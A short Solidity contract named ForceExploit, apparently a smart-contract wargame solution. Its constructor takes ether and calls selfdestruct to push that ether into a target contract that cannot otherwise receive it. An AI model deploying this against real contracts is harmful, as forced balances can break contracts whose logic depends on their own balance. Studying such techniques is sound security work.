pragma solidity 0.8.4;

contract ForceExploit{

	// Variables & Declarations
	address forceAddr;

	// Constructor
	constructor(address payable _addr) payable {
		require(msg.value > 0);
		selfdestruct(_addr);
	}

}